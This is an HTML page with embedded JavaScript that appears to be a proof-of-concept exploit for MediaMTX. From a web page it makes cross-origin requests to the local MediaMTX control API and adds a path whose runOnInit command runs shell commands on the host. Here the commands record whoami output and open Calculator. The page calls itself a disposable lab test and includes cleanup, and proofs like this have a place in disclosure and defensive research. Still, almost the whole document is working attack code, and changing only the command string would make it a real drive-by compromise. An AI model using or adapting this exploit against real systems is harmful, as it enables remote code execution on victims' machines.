<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>MediaMTX CORS/LNA bounded runOnInit proof</title>
  <style>
    body { font-family: system-ui, sans-serif; max-width: 900px; margin: 40px auto; padding: 0 16px; }
    input { width: 100%; box-sizing: border-box; padding: 8px; margin: 6px 0 12px; }
    button { margin: 6px 8px 6px 0; padding: 8px 12px; }
    pre { white-space: pre-wrap; background: #f4f4f4; padding: 12px; border-radius: 6px; }
    code { word-break: break-all; }
  </style>
</head>
<body>
  <h1>MediaMTX CORS/LNA bounded runOnInit proof</h1>
  <p>
    Disposable local lab only. This test adds one temporary runtime path whose
    <code>runOnInit</code> writes a marker/identity file into <code>%TEMP%</code>
    and opens Calculator. It does not modify mediamtx.yml.
  </p>

  <label>
    API base
    <input id="base" value="http://localhost:19997/v3">
  </label>

  <p><strong>Command:</strong></p>
  <pre id="cmd"></pre>

  <button id="run">1. Add temporary path and execute</button>
  <button id="cleanup">2. Delete temporary path</button>

  <pre id="out"></pre>

<script>
const out = document.getElementById("out");
const baseInput = document.getElementById("base");
const command =
  'cmd /c "whoami > %TEMP%\\mediamtx-cors-rce-poc.txt & ' +
  'echo MEDIAMTX_CORS_RCE_POC>>%TEMP%\\mediamtx-cors-rce-poc.txt & ' +
  'start calc.exe & timeout /t 10 >nul"';

document.getElementById("cmd").textContent = command;

let pathName = null;

function write(v) {
  out.textContent += (typeof v === "string" ? v : JSON.stringify(v, null, 2)) + "\n";
}

async function req(path, options = {}) {
  const base = baseInput.value.replace(/\/+$/, "");
  const url = base + path;
  const opts = {
    mode: "cors",
    credentials: "omit",
    cache: "no-store",
    ...options,
  };

  write(`--> ${opts.method || "GET"} ${url}`);

  try {
    const r = await fetch(url, opts);
    const text = await r.text();
    let body = text;
    try { body = JSON.parse(text); } catch (_) {}

    const result = { ok: r.ok, status: r.status, body };
    write(result);
    return result;
  } catch (e) {
    const result = { fetchRejected: true, name: e.name, message: e.message };
    write(result);
    throw e;
  }
}

document.getElementById("run").onclick = async () => {
  out.textContent = "";
  write({
    pageOrigin: location.origin,
    isSecureContext: window.isSecureContext,
    userAgent: navigator.userAgent,
  });

  pathName = "cors-rce-poc-" + Date.now();

  const body = {
    runOnInit: command,
    runOnInitRestart: false
  };

  try {
    const r = await req("/config/paths/add/" + encodeURIComponent(pathName), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });

    if (!r.ok) {
      throw new Error(`path add failed: HTTP ${r.status}`);
    }

    write(`PATH: ${pathName}`);
    write("EXPECTED FILE: %TEMP%\\mediamtx-cors-rce-poc.txt");
    write("EXPECTED VISIBLE EFFECT: Calculator opens.");
    write("Check the MediaMTX console for a runOnInit command-start message.");
  } catch (e) {
    write(`RESULT: failed: ${e.message}`);
  }
};

document.getElementById("cleanup").onclick = async () => {
  if (!pathName) {
    write("No path created in this page session.");
    return;
  }

  try {
    const r = await req("/config/paths/delete/" + encodeURIComponent(pathName), {
      method: "DELETE",
    });
    if (!r.ok) throw new Error(`path delete failed: HTTP ${r.status}`);
    write(`Deleted runtime path: ${pathName}`);
    pathName = null;
  } catch (e) {
    write(`Cleanup failed: ${e.message}`);
  }
};
</script>
</body>
</html>
